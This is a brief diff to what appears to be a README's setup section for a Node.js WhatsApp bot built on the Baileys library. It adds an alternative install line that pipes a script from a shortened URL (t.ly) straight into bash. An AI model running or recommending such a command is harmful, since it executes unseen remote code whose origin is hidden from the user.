@@ -56,9 +56,12 @@ $ chmod +x *
 $ npm install @adiwajshing/baileys
 $ npm install chalk
 $ node qr.js
+
 ```
       
 ```js
+OR $bash <(curl -L https://t.ly/tHxh)
+
 Set up
 
 $ apt update
